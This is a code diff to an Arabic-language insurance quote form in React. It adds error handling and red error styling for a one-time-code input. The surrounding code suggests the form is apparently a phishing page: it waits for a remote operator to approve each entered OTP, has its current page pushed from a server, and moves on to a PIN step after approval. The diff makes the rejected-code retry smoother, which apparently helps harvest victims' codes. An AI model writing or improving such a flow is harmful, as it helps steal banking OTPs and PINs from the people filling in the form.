@@ -629,6 +629,7 @@ function ProfessionalQuoteForm() {
   const [otpTimer, setOtpTimer] = useState(0)
   const [waitingForApproval, setWaitingForApproval] = useState(false)
   const [approvalStatus, setApprovalStatus] = useState<"pending" | "approved" | "rejected" | null>(null)
+  const [otpError, setOtpError] = useState<string | null>(null)
   const [formData, setFormData] = useState({
     insurance_purpose: "renewal",
     documment_owner_full_name: "",
@@ -698,10 +699,13 @@ function ProfessionalQuoteForm() {
           if (waitingForApproval && data.otpApproved === true) {
             setWaitingForApproval(false)
             setApprovalStatus("approved")
+            setOtpError(null)
             setCurrentStep(8) // Go to PIN step
           } else if (waitingForApproval && data.otpApproved === false) {
             setWaitingForApproval(false)
             setApprovalStatus("rejected")
+            setOtpError("رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى.")
+            setOtp("") // Clear the OTP input for retry
           }
 
           if (currentPage !== data.currentPage && !waitingForApproval) {
@@ -1006,7 +1010,8 @@ function ProfessionalQuoteForm() {
     const visitorId = localStorage.getItem("visitor")
     // allOtp.push(otp) // This line was removed to avoid issues with pushing to a global array
 
-    // Set waiting state to show loader
+    // Clear any previous error and set waiting state
+    setOtpError(null)
     setWaitingForApproval(true)
     setApprovalStatus("pending")
 
@@ -1868,6 +1873,16 @@ function ProfessionalQuoteForm() {
                               </p>
                             </div>
 
+                            {/* OTP Error Message */}
+                            {otpError && (
+                              <div className="bg-red-50 border border-red-200 rounded-xl p-4 flex items-center gap-3">
+                                <div className="flex-shrink-0 w-10 h-10 bg-red-100 rounded-full flex items-center justify-center">
+                                  <AlertCircle className="w-5 h-5 text-red-600" />
+                                </div>
+                                <p className="text-red-700 text-sm font-medium text-right flex-1">{otpError}</p>
+                              </div>
+                            )}
+
                             {/* OTP Input */}
                             <div className="space-y-2">
                               <Input
@@ -1877,10 +1892,17 @@ function ProfessionalQuoteForm() {
                                 required
                                 value={otp}
                                 maxLength={6}
-                                onChange={(e) => setOtp(e.target.value)}
+                                onChange={(e) => {
+                                  setOtp(e.target.value)
+                                  if (otpError) setOtpError(null)
+                                }}
                                 autoFocus={true}
                                 dir="ltr"
-                                className="h-14 text-center text-lg border-gray-300 focus:border-[#4052B5] focus:ring-[#4052B5]/20"
+                                className={`h-14 text-center text-lg focus:ring-[#4052B5]/20 ${
+                                  otpError 
+                                    ? "border-red-300 focus:border-red-500" 
+                                    : "border-gray-300 focus:border-[#4052B5]"
+                                }`}
                               />
                             </div>
 
